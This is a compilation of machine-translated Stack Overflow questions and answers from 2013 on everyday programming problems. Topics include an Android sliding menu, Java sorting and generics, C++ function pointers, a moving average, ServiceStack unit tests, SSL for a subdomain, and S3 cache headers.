在我的应用程序中，滑动菜单有效。我可以从右向左滑动，菜单就会出现。但问题是，当我在菜单中时，我无法滑回我来自的片段。返回的唯一方法是使用返回按钮。此外，当您在菜单中时，在您看到背景上的前一个片段的右侧没有填充。

我正在寻找它。我已经搜索了该问题的示例，但找不到我忘记的基本内容。

我的主要活动：

```
public class MainActivity extends SlidingFragmentActivity {

private Fragment rFrag;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    setBehindContentView(R.layout.menu_frame);

    if (savedInstanceState != null)
        rFrag = getSupportFragmentManager().getFragment(savedInstanceState, "mContent");
    if (rFrag == null)
        rFrag = new RecentGridFragment();   

    FragmentTransaction fragment = getSupportFragmentManager().beginTransaction();

    fragment.replace(R.id.content_frame, rFrag);

    MenuFragment mFrag = new MenuFragment();
    fragment.replace(R.id.menu_frame, mFrag);
    fragment.commit();

    //Sliding menu
    SlidingMenu sMenu = new SlidingMenu(this);
    sMenu.setBehindOffsetRes(R.dimen.slidingmenu_offset);
    sMenu.setShadowWidthRes(R.dimen.shadow_width);
    sMenu.setShadowDrawable(R.drawable.shadow);
    sMenu.setBehindScrollScale(0.25f);
    sMenu.setFadeDegree(0.25f);
    sMenu.setSlidingEnabled(true);
    sMenu.setTouchModeAbove(SlidingMenu.TOUCHMODE_FULLSCREEN);

    getSupportActionBar().setDisplayHomeAsUpEnabled(true);
}
@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // TODO Auto-generated method stub
    return super.onCreateOptionsMenu(menu);
}
@Override
public void onSaveInstanceState(Bundle outState) {
    super.onSaveInstanceState(outState);
    getSupportFragmentManager().putFragment(outState, "mContent", rFrag);
}

@Override
public boolean onOptionsItemSelected(MenuItem item) {
    switch (item.getItemId()) {
    case android.R.id.home:
        toggle();
    }
    return super.onOptionsItemSelected(item);
}
public void switchContent(final Fragment inputFrag) {
    rFrag = inputFrag;
    FragmentTransaction fragment = getSupportFragmentManager().beginTransaction();
    fragment.replace(R.id.content_frame, inputFrag);
    fragment.commit();
    Handler h = new Handler();
    h.postDelayed(new Runnable() {
        public void run() {
            getSlidingMenu().showContent();
        }
    }, 50);
}} 
```

菜单：

```
public class MenuFragment extends ListFragment {

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
    return inflater.inflate(R.layout.list, null);
}

@Override
public void onActivityCreated(Bundle savedInstanceState) {
    super.onActivityCreated(savedInstanceState);
    String[] birds = getResources().getStringArray(R.array.birds);
    ArrayAdapter<String> colorAdapter = new ArrayAdapter<String>(getActivity(), 
            android.R.layout.simple_list_item_1, android.R.id.text1, birds);
    setListAdapter(colorAdapter);
}} 
```

包含内容的主片段

```
public class RecentGridFragment extends Fragment {

private int mImgRes;

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
    mImgRes = R.drawable.peacock;

    GridView gv = (GridView) inflater.inflate(R.layout.list_grid, null);
    gv.setBackgroundResource(android.R.color.black);
    gv.setAdapter(new GridAdapter());
    return gv;
}

@Override
public void onSaveInstanceState(Bundle outState) {
    super.onSaveInstanceState(outState);
}

private class GridAdapter extends BaseAdapter {

    @Override
    public int getCount() {
        return 30;
    }

    @Override
    public Object getItem(int position) {
        return null;
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        if (convertView == null) {
            convertView = getActivity().getLayoutInflater().inflate(R.layout.grid_item, null);
        }
        ImageView img = (ImageView) convertView.findViewById(R.id.grid_item_img);
        img.setImageResource(mImgRes);
        return convertView;
    }

}} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T09:28:49.843

我发现了我的错误：

我需要获得滑动活动而不是制作新的活动。

```
SlidingMenu sMenu = this.getSlidingMenu(); 
```

# python - 上传时的文件 Mod 时间差异

> ID：15510254
> 
> 赞同：0
> 
> 时间：2013-03-19T20:55:53.357
> 
> 标签：python, unix, python-2.7, unix-timestamp, dropbox-api

我正在客户端、服务器和 Dropbox（Mac 客户端、Debian 服务器）之间进行文件同步。我正在查看文件的修改时间以确定哪个是最新的。在我`os.path.getmtime(filePath)`用来获取修改时间的客户端上。

当我在客户端检查文件的最后修改时间，然后在上传后我再次在服务器或 Dropbox 上检查时，对于同一个文件，它们之间的时间存在不同的差异。我认为文件修改时间与文件相关联，而不是与它们所在的操作系统相关联，所以如果文件是在客户端上最后修改的，那么在服务器上检查时该修改时间戳应该是相同的吗？

谁能澄清上传文件是否对修改时间有影响，或者建议一个文件的这种时间变化可能来自哪里？任何建议将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T16:21:07.100

Dropbox服务器上的修改时间不一定是客户端上的修改时间，而是文件上传到服务器的时间。您可以对来自 /metadata 调用的文件使用“rev”属性来跟踪文件。

# java - 对 Arraylist 进行排序？树集不起作用。还有其他选择吗？

> ID：15510260
> 
> 赞同：0
> 
> 时间：2013-03-19T20:56:10.537
> 
> 标签：java, arrays

我正在尝试按姓氏的字母顺序对数组中的联系人进行排序（注意：联系人首先按姓氏引入“布朗和亚当斯”是我正在测试的姓氏。看来我的代码树集不是工作。有人可以帮我吗？

```
 public void print() {
    // print the list
    for (int i = 0; i < contacts.size(); i++) {
        Set<String> set = new TreeSet<String>();
        String str;

        str = contacts.get(i).toString();
            set.add(str);

        for (String key : set) {
            System.out.println(key);

        }
    }
} 
```

/*--------------- 我的运行 ---------

联系信息已保存。

棕色, asdf, asdf, asdf, asdf, asdf, asdf, asdf

亚当斯, asdf, asdf, asdf, asdf, asdf, asdf, asdf

---------------------------------/*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:02:23.977

你的做法是错误的！

```
Set<String> set = new TreeSet<String>();
for (int i = 0; i < contacts.size(); i++) {
       set.add(contacts.get(i).toString());
}

for (String key : set) {
  System.out.println(key);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:02:24.347

使用 Collections 类...`Collections.sort(contacts);`除非您想使用自己的代码来评估您的技能；-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:05:41.127

有几个问题，首先你要在循环的每次迭代中创建一个新的 TreeSet 来填充集合。其次，您正在调用一个循环以在每次迭代时打印 TreeSet 中的所有内容（您刚刚制作并放入一个东西），所以基本上您所做的只是按原始顺序打印数组。下面是一些解决这两个问题的代码：

```
public void print() {
    Set<String> set = new TreeSet<String>();

    // Fill up the TreeSet
    for (int i = 0; i < contacts.size(); i++) {
        String str = contacts.get(i).toString();
        set.add(str);
    }
    // Print out the TreeSet
    for (String key : set) {
        System.out.println(key);
    }
} 
```

}

# javascript - 动态墙更新：NodeJS

> ID：15510261
> 
> 赞同：1
> 
> 时间：2013-03-19T20:56:14.283
> 
> 标签：javascript, node.js, dynamic

基本上，我创建了一个使用 Jade 作为模板引擎的 NODEJS 应用程序，以及 Express 和 MySQL 数据库。

我希望创建一个允许用户共享部分文本的新页面，然后在其下方名为“Wall”的 div 将使用新状态动态更新。

基本上，理想情况下，它类似于 Facebook，在其中键入、共享内容，然后动态更新下面的页面。我还希望在用户朋友分享新帖子时更新墙页。用户共享的所有更新都将发送到数据库。

我进行了很多搜索，但似乎无法收集到正确的答案。我已将其范围缩小到使用以下任何一种：JQuery、Ajax、PHP。

由于我正在构建的网站是用 JS 构建的 - 我最好的选择是什么？

我对这一切都很陌生，但我假设当用户单击共享时，它会调用一个 JS 文件，然后将更新存储在数据库中。但是如何让我的“墙”刷新新内容？

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:53:03.490

采用...

```
setTimeout(function(){
  /* update wall here */
}, 1000) 
```

轮询您的“墙”后端并更新内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T03:05:24.057

你提出了一个概念性问题。因此，我将尽我所能解释一些您可以选择的概念选项，以进一步探索并自己研究如何在您的项目中最好地实现它。

你有两条路可以去这里。您可以在成功将 AJAX 写入数据库后进行自己的墙更新（在 UI 端进行刷新/重新渲染），这将是您在 AJAX 回调函数中实现的东西 - 基本上是在您执行之后执行的 JS 函数向数据库写入请求（提交新帖子）返回成功。

您可以探索的另一个选项分支是实现以下任一选项以基本上“侦听”服务器端的更改，并让重新渲染作为您使用的回调做出反应：

1.  [轮询](http://techoctave.com/c7/posts/60-simple-long-polling-example-with-javascript-and-jquery "轮询")- 基本上每 X 秒发出一个请求，以检查服务器端是否有更新或状态更改。

2.  WebSockets - 结帐[Socket.io](http://socket.io/ "套接字.io")。通过这个，您可以将消息从服​​务器端“推送”到您的客户端。需要注意的是，并非每个浏览器都普遍支持 WebSocket，根据过去的经验，我发现 WebSocket 协议甚至因浏览器版本而异。因此，如果您需要普遍支持，我会采用轮询方法。

祝你的项目好运，希望这会有所帮助！

# c++ - 如何声明一个以函数为参数的函数？

> ID：15510264
> 
> 赞同：3
> 
> 时间：2013-03-19T20:56:24.053
> 
> 标签：c++, time, function-pointers

对不起，冗长而令人困惑的标题！这是我的问题：我正在尝试编写一个函数来输出另一个函数所花费的时间。通常我只是传入函数及其参数，但在这种情况下，我试图为自己计时的函数将函数作为参数。

对于一个具体的例子，我试图让它工作：

```
void foo(void (*f) (T*)){
  ...function stuff...
}

                  --------not sure what this should be
                 | 
void runWithTime(void (*f) (void (*g) (T*))){
  f(g)
}

//runWithTime(foo); 
```

我希望能够调用`runWithTime(foo)`，但我不确定 type`runWithTime`的参数应该是什么。

任何帮助都会很棒！提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T21:04:08.513

一个简单的解决方案：

```
template<typename T>
auto runWithTime0(T _func) -> decltype(_func())
{
  startTimer();
  _func();
  endTimer();
}

template<typename T, typename P1>
auto runWithTime1(T _func, P1 _arg1) -> decltype(_func(_arg1))
{
  startTimer();
  _func(_arg1);
  endTimer();
}

// ...etc 
```

你可以用 boost::bind 做类似的事情，但如果这不可用，上面应该可以解决问题。

**编辑：**添加返回值，如果您的编译器支持 c++11（我相信 VC2010/2012，g++4.7 或更高版本），它将起作用

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:12:31.597

当您调用时，`runWithTime(foo)`您向它传递了一个指向函数的指针，这是`f`参数，但您没有提供`g`，所以您不能调用`f(g)`...这是什么意思？

为了让您的生活更简单，请使用一些 typedef：

```
// A pointer to a function that takes a single T* argument
typedef void (*func_ptr)(T*);

void foo(func_ptr f){
  ...function stuff...
}

// A pointer to a function that takes a single func_ptr argument
typedef void (*funcfunc_ptr)(func_ptr);

void runWithTime(funcfunc_ptr f, func_ptr g){
  f(g)
} 
```

现在应该很明显，您需要将两个参数传递给`runWithTime`, 例如，`runWithTime(foo, NULL)`或者带有签名的函数`runWithTime(foo, bar)`在哪里`bar``void bar(T*)`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:10:19.480

碰巧的是，我最近为几乎完全相同的目的编写了一些代码。我想出的是：

```
template <class F, class T>
void timer(F f, T &t, std::string const &title) { 
    unsigned count;
    clock_t start = clock();
    result = f(t, 'N');
    clock_t stop = clock();
    std::cout << std::left << std::setw(30) << title << "\tResult: " << result;
    std::cout << "\tTime: " << double(stop-start)/CLOCKS_PER_SEC << "\n";
} 
```

使用就像：`timer(function1, infile, "Running function 1");`

# c++ - 计算序列中元素的平均值而不对其进行迭代

> ID：15510267
> 
> 赞同：-3
> 
> 时间：2013-03-19T20:56:27.910
> 
> 标签：c++, algorithm, stl

编写一个在其构造函数中采用步长 (n) 的类。该类中唯一的方法接受一个整数，将其添加到一个数字序列中，并返回插入该序列的最后 n 个值的平均值。**不要遍历序列来计算平均值。**

*不，这不是家庭作业*

以下是我在 C++ 中的做法：

1.  初始化两个 STL `queue<int>`，其中一个有长度`n`并且被称为`buffer`
2.  用户 - 输入值动态存储在缓冲区中。填满后`buffer`，将用户输入值添加到“sum”并减去该`buffer.front()`值。
3.  将第一个值推`buffer`入第二个`queue<int>`命名的值`values`
4.  弹出第一个值 ( `buffer.pop()`)
5.  `sum`通过除以返回平均值`n`

以下是我想出的代码：

```
#ifndef calcAverage_Window_h
#define calcAverage_Window_h

#include <iostream>
#include <queue>
using namespace std;

class Window{
private:
    int n, sum;
    queue<int> values, buffer, sums;

public:
    Window(int);
    float calcAverage(int);
};

#endif

#include "Window.h"

Window::Window(int m){
    n = m;
    buffer.push(1);
    buffer.push(2);
    buffer.push(3);
    sum = 6;
}

float Window::calcAverage(int val){
    buffer.push(val);
    values.push(buffer.front());
    sum = sum + val - buffer.front();
    buffer.pop();

    return float(sum)/n; //float(sum) required so that calcAverage doesn't return an int
}

#include "Window.h"

int main()
{
    Window w(3);
    cout<<w.calcAverage(4)<<endl;
    cout<<w.calcAverage(5)<<endl;
    cout<<w.calcAverage(6)<<endl;
    return 0;
} 
```

我有以下问题：

1.  有一个更好的方法吗？
2.  如果我们也不允许使用 STL，我会实现一个队列并将其用于`buffer`and `values`。有没有人有更好的主意？
3.  `Window(n)`我通过在构造函数中初始化缓冲区来作弊。那是因为：1）我不知道我还能怎么做 2）对于什么时候的情况可能很清楚`n = 2`，但对于`n = 3`.
4.  这个方法/代码会在哪里失败？
5.  我凭经验想到了这种方法。有没有一种算法方法来看待这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:09:03.260

回答您的几个问题：

* * *

> 这个方法/代码会在哪里失败？

好吧，假设上面的代码没有错误，如果您决定转移到浮点数据，它不一定能正常工作。

请注意，与直接实现移动平均线相比，它的溢出行为也略有不同。

* * *

> 有没有一种算法方法来看待这个问题？

是的。对于窗口大小，时间和时间`L`的移动总和如下：`n``n-1`

```
y[n]   = x[n] + x[n-1] + ... + x[n-L+1]
y[n-1] =        x[n-1] + ... + x[n-L+1] + x[n-L] 
```

从另一个方程中减去一个方程，你得到：

```
y[n] - y[n-1] = x[n] - x[n-L] 
```

移动`y[n-1]`到等号的另一边，你就完成了。

# java - 简单的打字机程序错误

> ID：15510268
> 
> 赞同：-1
> 
> 时间：2013-03-19T20:56:28.333
> 
> 标签：java

所以我遇到了一个似乎没有任何意义的错误，而解决方案很可能是盯着我的脸。我确实理解“字符串索引超出范围：XX”，但即使我多次输入相同的字符串，它似乎也会改变该值。它说（未知来源）我认为是短语变量？而且我确实看到错误发生在第 85 行，该行打印了该短语。然而，在我这个稍微新手的眼里，一切看起来都很好。有什么智慧可以发泄吗？

资源：

![代码](../Images/2dce37c2e8d6b5f76736e27977d6c9d0.png)

[图片链接](https://i.stack.imgur.com/rBfnW.jpg)。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T20:58:51.593

而不是`i <= phrase.length()`你应该使用`i < phrase.length()`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:05:24.200

问题在于在`phrase.substring(i,i+1)`最后一次迭代中它会超出范围。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:03:38.553

问题是

```
for (i = 0; i <= phrase.length(); i++); { 
```

应该

```
for (i = 0; i <= phrase.length(); i++) { 
```

（去掉最后的分号）

**解释：**

您的代码重新格式化：

```
for (i = 0; i <= phrase.length(); i++)
  ;

{
  pause();
  System.out.print(...)
} 
```

只有`;`在 for 循环中。这`{ ... }`是一个单独的语句（即不是 for 循环的一部分）。

将变量声明放在循环内一般会防止这种情况在以后发生：（因为`i`循环外的引用会产生错误）

```
for (int i = 0; i <= phrase.length(); i++) 
```

**还：**

它可能也应该`<`是`<=`：

```
for (i = 0; i < phrase.length(); i++) { 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-19T21:00:31.130

在第 83 行，我应该是 <phrase.length() 而不是 <= 。

固定循环：

```
for (i = 0; i < phrase.length(); i++) { 
```

# jquery - AJAX 请求 - 无法获取 div 内容

> ID：15510269
> 
> 赞同：1
> 
> 时间：2013-03-19T20:56:28.960
> 
> 标签：jquery, ajax

这是我的 AJAX 请求的一部分。它工作正常 - 发送`code`到`index.php` 但是当我想`(div id="editor")`从响应中获取一些内容时，我只会得到类似的东西`[object Object]`

```
$.ajax({
      url: 'index.php',
      type: 'GET',
      data: {
         content: code
      },
      success: function(data){
          alert($('#editor'));
      } 
```

当我将功能更改为：

```
success: function(data){
          alert(data);
     } 
```

我正在获取页面的完整源代码

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T21:01:25.170

您需要更改 jQuery 搜索的范围。（这是 jQuery 选择器的第二个参数，默认为 'document'）。

```
alert($('#editor',data));
```

此外，您目前正在获得 [object Object]，因为警报无法在没有一点帮助的情况下将对象拆分为刺痛。尝试`console.log($('#editor',data))`或`alert($('#editor',data).html())`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:01:55.827

根据您要摆脱 div 的内容，尝试

```
alert($('#editor').text()); 
```

或者

```
alert($('#editor').html()); 
```

# java - Java 泛型函数

> ID：15510284
> 
> 赞同：2
> 
> 时间：2013-03-19T20:57:17.617
> 
> 标签：java, generics

我很想知道这是否像我认为的那样有效。我确实意识到泛型在运行时只是作为对象结束。这只是我在 Eclipse 中遇到的一个问题。在查看 Java 如何解决 Collections.emptyList() 中泛型的转换问题时，我发现了这个结构。当我从正在使用的任何界面中删除列表时，我已经厌倦了抑制警告。

```
<T> List<T> emptyList() 
```

在我看来，它正在阅读作业中的通用演员表。例如，这些工作中的任何一个都不会引发任何类型的转换错误。

```
List<Object> list = Collections.emptyList();
List<MyObect> list2 = Collections.emptyList(); 
```

任何人都可以向我指出有关其工作原理的文档。我什至不知道该怎么称呼它来搜索它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:00:40.993

`emptyList`它是从分配给它的变量的声明中推断出的类型。如果您想自己指定，可以使用

```
Collections.<MyObject>emptyList(); 
```

这可能很有用，例如，在方法中`Arrays.asList`。该方法允许您编写如下代码：

```
List<String> myList = Arrays.asList("a", "b", "c"); 
```

但如果你有 a `String[]`，`asList`会给你 a`List<String[]>`而不是 a `List<String>`。您可以按如下方式覆盖它：

```
List<String> myList = Arrays.<String>asList(myStringArray); 
```

更多关于泛型方法中的类型推断的[信息](http://docs.oracle.com/javase/tutorial/extra/generics/methods.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:00:32.880

Java “[类型推断”文档](http://docs.oracle.com/javase/tutorial/java/generics/genTypeInference.html)应该回答与此相关的大多数问题。

> 类型推断是 Java 编译器查看每个方法调用和相应声明以确定使调用适用的类型参数（或参数）的能力。推理算法确定参数的类型，以及分配或返回结果的类型（如果可用）。最后，推理算法试图找到适用于所有参数的最具体的类型。
> 
> 为了说明最后一点，在以下示例中，推理确定传递给 pick 方法的第二个参数是 type `Serializable`：
> 
> ```
> static <T> T pick(T a1, T a2) { return a2; }
> Serializable s = pick("d", new ArrayList<String>()); 
> ```

* * *

你可以改变

```
List<MyObect> list2 = Collections.emptyList(); 
```

到

```
List<MyObect> list2 = Collections.<MyObject>emptyList(); 
```

为了明确`<T>`应该绑定到`<MyObject>`，尽管对于变量初始化器，它应该自动推断。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:06:29.437

不确定你到底在问什么。如果你想在没有编译器警告你的情况下执行强制转换，我们可以欺骗编译器这样做

```
String string = "hello";
Number number = bruteCast(string);

@SuppressWarnings("unchecked")
public static <A,B> B bruteCast(A a)
{
    return (B)(Object)a;
} 
```

当然，您必须谨慎使用它，确保每次调用`bruteCast()`都确实正确。

# unit-testing - ServiceStack 服务的单元测试

> ID：15510292
> 
> 赞同：4
> 
> 时间：2013-03-19T20:57:38.780
> 
> 标签：unit-testing, nunit, moq, servicestack

我正在尝试为 ServiceStack 服务编写简单的单元测试，我正在通过他们在线的测试和这里的几个线程。这是我想要完成的大部分细节的主线程 -[使用 ServiceStack 对 HTTPRequest 标头进行单元测试](https://stackoverflow.com/questions/14790695/unit-test-httprequest-headers-with-servicestack/14791657)。

但是，我在将 IDbConnection 对象注入服务时遇到了问题。在 web 方法中，使用 OrmLite 的 GetDictionary 方法填充字典对象。但我无法模拟它，因为 GetDictionary 是扩展方法。

```
 private Mock<IDbConnection> _dbConnectionMock;
 private Dictionary<string, string> _nameValuePairs;

 [SetUp]
 public void SetUp()
 {
    _dbConnectionMock = new Mock<IDbConnection>();

    _nameValuePairs = new Dictionary<string, string>()
    {
            {"name","test"},
            {"Updatedby",   "5/23/12 7:00:15 AM"},
            {"Address", "212 Adam St."}
    };
} 
```

在测试方法中

```
 var service = new CustomerLookupService(_dbConnectionMock.Object);
 var response = (HttpResult)service.Any(new CustomerLookup { name = "test" });
 //assert statements 
```

如果不能模拟 GetDictionary 方法，我什至愿意调用命中 DB 的 web 方法，为此我需要创建 AppHost。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T22:28:25.193

我认为有几个选项可供研究。

*   模拟/存根/单元测试扩展方法[here](http://blogs.clariusconsulting.net/kzu/how-extension-methods-ruined-unit-testing-and-oop-and-a-way-forward/)，[here](https://stackoverflow.com/questions/2295960/mocking-extension-methods-with-moq)或其他各种地方。我认为没有首选的方法可以做到这一点，但有一些选项和框架/库可以提供帮助。

*   为单元测试运行内存数据库，例如 Sqlite。见[这里](http://rickardnilsson.net/post/2013/01/19/how-to-unit-test-your-database-code-when-using-servicestack-ormlite.aspx)。

*   您可以将 IDConnection 抽象为 CustomerLookUpRepository 并将您的 CustomerLookUpRepository 注入您的服务。然后你可以模拟你的“存储库”。

我已经尝试过这种“安排”。到目前为止，它似乎适用于大多数基本情况。数据访问模式取自[Redis Web 服务示例](https://github.com/ServiceStack/ServiceStack.RedisWebServices)。不过，YMMV。

**测试**（使用 RhinoMocks）

```
 public void SomeTest()
    {
        var _nameValuePairs = new Dictionary<string, string>()
        {
            {"name","test"},
            {"Updatedby",   "5/23/12 7:00:15 AM"},
            {"Address", "212 Adam St."}
        };

        var mockSqlRepository = MockRepository.GenerateMock<ISqlRepository>();
        mockSqlRepository.Stub(
            x => x.Exec(Arg<Func<IDbConnection, Dictionary<string, string>>>.Is.NotNull)).Return(_nameValuePairs);

        var service = new CustomerLookupService { SqlRepository = mockSqlRepository }
        //MORE TEST CODE...  
    } 
```

**服务类**- 使用 ISqlRepository 抽象/隐藏 IDbConnection。ISqlRepository 有一个以函数为参数的函数。（参数的）函数签名将 IDbConnection 作为参数，因此我不必编写几个方法来访问数据库。

```
public class CustomerLookupService
{
    public ISqlRepository SqlRepository { get; set; }

    public void Any(CustomerLookup request)
    {
        var results =
            SqlExec<Dictionary<string, string>>((con) => con.GetDictionary<type, type>("Select id, name from table"));
        //MORE SERVICE CODE
    }

    public T SqlExec<T>(Func<IDbConnection, T> fn)
    {
        return SqlRepository.Exec(fn);
    }
} 
```

**ISqlRepository**

```
public interface ISqlRepository
{
    T Exec<T>(Func<IDbConnection, T> fn);
} 
```

**SqlRepository**

```
public class SqlRepository : ISqlRepository
{
    public IDbConnectionFactory DbFactory { get; set; }

    public T Exec<T>(Func<IDbConnection, T> fn)
    {
        using (var con = DbFactory.OpenDbConnection())
        {
            return fn(con);
        }
    }
} 
```

# security - Secure.domain.net 的 SSL 证书 - 当我不拥有 www.domain.net

> ID：15510295
> 
> 赞同：1
> 
> 时间：2013-03-19T20:58:10.557
> 
> 标签：security, http, ssl, https

我正在为拥有现有网站的企业编写应用程序。

我希望应用程序位于 SSL 之后，并且在我的服务器上 - 与现有企业的网站完全分开。

例如，他们是： http: [//www.dogsittingservices.net](http://www.dogsittingservices.net) - 指向他们的网站，在他们的主机上。

我希望能够拥有[https://secure.dogsittingservices.net](https://secure.dogsittingservices.net) - 指向我服务器上的 Web 应用程序。

这可能吗？如果是这样，谁必须订购 SSL 证书——www.dogsittingservices.net 目前的业务——还是我？如何为我不拥有的域订购证书？这就是我的困境。

感谢您的任何指导/建议，

标记

**更新@EJP回答**

这些是我需要采取的步骤：

1.  拥有该网站的企业将在其 DNS 中设置：secure.dogsittingservices.net
2.  然后他们会将该 DNS 指向我服务器的 IP 地址
3.  然后我会在我的服务器上设置一个网站，名称为：secure.dogsittingservices.net
4.  然后我会从我的服务器为它生成一个 CSR
5.  然后，我会将 CSR 授予我正在为其工作的企业
6.  然后，企业必须使用我从服务器生成的 CSR 来订购 SSL
7.  然后他们会将 SSL 密钥/代码发送给我以应用到我的服务器

这通常是如何实现的？

谢谢，

标记

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:41:22.757

他们必须获得自己的 SSL 证书。这就是他们的全部意义所在，他们明确地确定了他们所发给的业务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T03:33:27.737

You can also have one SSL certificate with multiple site-use, as an option. Read up more on [SAN certificates](http://www.digicert.com/subject-alternative-name.htm) as it may become relevant to your solution. This would allow you to share the certificate and suit both hostnames. You can also do a [wildcard certificate](http://www.thawte.com/ssl/wildcard-ssl-certificates/index.html) as well if you may have more hostnames for that domain in the future.

# caching - 静态文件应该缓存多长时间？

> ID：15510299
> 
> 赞同：3
> 
> 时间：2013-03-19T20:58:25.987
> 
> 标签：caching, amazon-s3, amazon-cloudfront

我想为一些 Amazon S3 文件设置浏览器缓存。我打算使用这个元数据：

```
Cache-Control: max-age=86400, must-revalidate 
```

这相当于一天。

我看到的许多示例如下所示：

```
Cache-Control: max-age=3600 
```

为什么只有 3600，为什么不使用 must-revalidate？

对于我很少更改的文件，应该缓存多长时间？

如果我更新文件并需要立即看到该更新，但它的缓存不会再过期 5 天，会发生什么情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:09:14.083

> 为什么只有3600？

假设是因为该特定示例的作者认为一小时是该页面的适当缓存超时。

* * *

> 为什么不使用 must-revalidate ？

如果响应不包含严格遵守您设置的缓存规则所需的信息，则省略 must-revalidate 理论上可以确保通过缓存传递更多请求。有关详细信息，请参阅[此答案](https://stackoverflow.com/a/7574135/13627)，最相关的部分来自 HTTP 规范：

> 当缓存有一个陈旧的条目要用作对客户端请求的响应时，它首先必须与源服务器（或可能带有新响应的中间缓存）检查以查看其缓存条目是否仍然可用.

* * *

> 对于我很少更改的文件，应该缓存多长时间？

许多网络性能建议说要设置一个很远的未来缓存过期时间，比如几年。这样，客户端浏览器只会下载一次数据，后续访问将从缓存中获取。这适用于“真正的静态”文件，例如 Javascript 或 CSS。

另一方面，如果数据是动态的，但不会经常变化，您应该根据您的具体场景设置一个合理的过期时间。您是否需要在最新版本可用时立即将其提供给客户，还是可以提供过时的版本？你知道数据什么时候改变吗？等等。一小时或一天通常是服务器负载、客户端性能和数据新鲜度之间的适当权衡，但这取决于*您的要求*。

* * *

> 如果我更新文件并需要立即看到该更新，但它的缓存不会再过期 5 天，会发生什么情况？

为文件指定一个新名称，或在查询字符串中附加一个值。您当然需要更新所有链接。这是静态资源需要更改时的一般方法。

此外，[这里是](http://palpapers.plynt.com/issues/2008Jul/cache-control-attributes/)对您可用的缓存控制属性的一个很好的概述。

# c# - 如何在 XAML 中访问 ListBox 中项目的属性？

> ID：15510301
> 
> 赞同：1
> 
> 时间：2013-03-19T20:58:31.123
> 
> 标签：c#, windows-phone-8, windows-phone

我有一个“SmartText”项目的列表框，它们基本上是具有标题、描述和 URL 属性的链接对象。我正在尝试使 XAML 中的 Grid 面板可点击，以便点击整个 Grid 导航到 url。如何访问 URL 属性以便导航到它？

```
<controls:Pivot VerticalAlignment="Stretch"
                HorizontalAlignment="Stretch"
                Margin="0,0,0,0"
                x:Name="PivotRoot"
                Title="{Binding SmartTextStateModel.Title}" 
                SelectionChanged="Pivot_SelectionChanged"
                Background="{StaticResource PhoneBackgroundBrush}">
    <controls:PivotItem Header="{Binding Path=Labels.SmartTextBingHeaderLabel, Source={StaticResource Translations}}" Tag="bingsearch">
        <ListBox ItemsSource="{Binding SmartTextStateModel.BingItemResults}">
            <ListBox.ItemTemplate>
                <DataTemplate>
                    <Grid Tap="SmartTextElement_Tap">
                        <Grid.RowDefinitions>
                            <RowDefinition Height="*"/>
                            <RowDefinition Height="Auto"/>
                            <RowDefinition Height="Auto"/>
                        </Grid.RowDefinitions>
                        <TextBlock Grid.Row="0" FontSize="40" Text="{Binding Path=Title}" />
                        <TextBlock Grid.Row="1" TextWrapping="Wrap" FontSize="18.667" Foreground="{StaticResource PhoneDisabledBrush}"
                                   TextTrimming="WordEllipsis" MaxHeight="100" Text="{Binding Path=Description}"/>
                        <TextBlock Grid.Row="2" Foreground="{StaticResource PhoneAccentBrush}" Text="{Binding Path=Url}"/>
                    </Grid>
                </DataTemplate>
            </ListBox.ItemTemplate>
        </ListBox>
    </controls:PivotItem>

    ...

</controls:Pivot> 
```

和类定义

```
public class SmartTextItemModel : BaseModel
{
    private string _title;
    private string _description;
    private string _url;

    /// <summary>
    /// The title of the linked page (Large text)
    /// </summary>
    public string Title
    {
        get { return _title; }
        set
        {
            if (_title != value)
            {
                _title = value;
                NotifyPropertyChanged("Title");
            }
        }
    }

    /// <summary>
    /// Description of the page (smaller text)
    /// </summary>
    public string Description
    {
        get { return _description; }
        set
        {
            if (_description != value)
            {
                _description = value;
                NotifyPropertyChanged("Description");
            }
        }
    }

    /// <summary>
    /// Url of the page
    /// </summary>
    public string Url
    {
        get { return _url; }
        set
        {
            if (_url != value)
            {
                _url = value;
                NotifyPropertyChanged("Url");
            }
        }
    }

    public SmartTextItemModel(string _t, string _d, string _u)
    {
        this._title = _t;
        this._description = _d;
        this._url = _u;
    }
} 
```

当然，.cs 文件中的事件处理程序如下所示：

```
private void SmartTextElement_Tap(object sender, System.Windows.Input.GestureEventArgs e)
{
    ... ?
    // Navigate to url...
} 
```

